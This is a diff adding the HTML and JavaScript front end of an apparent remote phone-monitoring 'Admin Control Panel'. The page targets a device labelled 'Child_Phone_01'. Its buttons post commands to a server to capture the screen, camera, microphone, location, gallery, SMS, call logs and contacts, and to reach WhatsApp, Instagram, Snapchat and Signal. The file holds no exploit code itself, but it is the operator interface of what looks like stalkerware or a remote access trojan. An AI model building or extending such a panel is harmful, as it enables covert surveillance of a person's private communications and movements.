@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Control Panel</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-color: #0f0f0f;
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
+            --text-main: #ffffff;
+            --text-muted: #aaaaaa;
+            --accent: #4caf50;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: linear-gradient(45deg, #000000, #1a1a1a);
+            color: var(--text-main);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 30px;
+            padding: 20px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            border: 1px solid var(--glass-border);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .device-name { font-size: 1.2rem; font-weight: bold; }
+        .status-badge {
+            background: #333;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .dot { height: 8px; width: 8px; background-color: var(--accent); border-radius: 50%; }
+
+        .info-panel {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .info-card {
+            flex: 1;
+            background: var(--glass-bg);
+            padding: 15px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
+        }
+        .label { font-size: 0.7rem; color: var(--text-muted); letter-spacing: 1px; }
+        .value { font-size: 1rem; margin-top: 5px; font-weight: 500; }
+
+        .battery-details { margin-bottom: 25px; padding: 10px; }
+        .battery-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+        }
+
+        .controls-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+        }
+
+        /* Updated control-btn to support links */
+        .control-btn {
+            background: var(--glass-bg);
+            border-radius: 18px;
+            aspect-ratio: 1/1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--glass-border);
+            cursor: pointer;
+            transition: 0.2s;
+            text-decoration: none; /* Link underline hatane ke liye */
+            color: var(--text-main); /* Link color white rakhne ke liye */
+        }
+        .control-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+        .control-btn i { font-size: 1.2rem; margin-bottom: 8px; color: #fff; }
+        .control-btn span { font-size: 0.65rem; text-align: center; color: #ddd; }
+
+        .fa-whatsapp { color: #25D366 !important; }
+        .fa-instagram { color: #E1306C !important; }
+        .fa-snapchat { color: #FFFC00 !important; text-shadow: 0 0 2px #000; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <div>
+                <i class="fa-solid fa-bars"></i>
+                <span class="device-name" style="margin-left: 10px;">VIVO V2225C</span>
+            </div>
+            <div class="status-badge">
+                <span class="dot"></span> Connected
+            </div>
+        </div>
+
+        <div class="info-panel">
+            <div class="info-card">
+                <div class="label">VERSION</div>
+                <div class="value">Android 15</div>
+            </div>
+            <div class="info-card">
+                <div class="label">NETWORK</div>
+                <div class="value">Online <i class="fa-solid fa-wifi"></i></div>
+            </div>
+        </div>
+
+        <div class="battery-details">
+            <div class="label" style="margin-bottom: 5px;">BATTERY INFO</div>
+            <div class="battery-grid">
+                <span>26%</span> <span>16°C</span>
+                <span>GOOD</span> <span>3753 mA</span>
+                <span style="grid-column: span 2;">DISCHARGING</span>
+            </div>
+        </div>
+
+        <div class="controls-grid">
+            <div class="control-btn" onclick="sendCommand('screen_share')">
+                <i class="fa-solid fa-mobile-screen"></i><span>Screen</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('camera')">
+                <i class="fa-solid fa-camera"></i><span>Camera</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('audio')">
+                <i class="fa-solid fa-microphone"></i><span>Audio</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('location')">
+                <i class="fa-solid fa-location-dot"></i><span>Location</span>
+            </div>
+
+            <div class="control-btn" onclick="sendCommand('gallery')">
+                <i class="fa-solid fa-images"></i><span>Gallery</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('notifications')">
+                <i class="fa-regular fa-message"></i><span>Notify</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('sound')">
+                <i class="fa-solid fa-bell"></i><span>Sound</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('recording')">
+                <i class="fa-solid fa-circle-dot"></i><span>Rec</span>
+            </div>
+
+            <div class="control-btn" onclick="sendCommand('whatsapp')">
+                <i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('instagram')">
+                <i class="fa-brands fa-instagram"></i><span>Instagram</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('snapchat')">
+                <i class="fa-brands fa-snapchat"></i><span>Snapchat</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('signal')">
+                <i class="fa-solid fa-comment-dots"></i><span>Signal</span>
+            </div>
+
+            <a href="view_call_logs.html" class="control-btn">
+                <i class="fa-solid fa-phone"></i><span>Call Logs</span>
+            </a>
+            
+            <a href="view_contacts.html" class="control-btn">
+                <i class="fa-solid fa-address-book"></i><span>Contacts</span>
+            </a>
+
+            <div class="control-btn" onclick="sendCommand('sms')">
+                <i class="fa-solid fa-comments"></i><span>SMS</span>
+            </div>
+            <div class="control-btn" onclick="sendCommand('apps')">
+                <i class="fa-brands fa-google-play"></i><span>Apps</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+  
+    function sendCommand(action) {
+        console.log("Sending command: " + action);
+
+        // Server ko batao ki ye command bhejna hai
+        fetch('/api/send-command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                device_id: 'Child_Phone_01', // Filhal hardcoded hai
+                command: action
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            alert("Command Sent: " + action);
+        })
+        .catch(err => console.error("Error:", err));
+    }
+</script>
+   
+</body>
+</html>
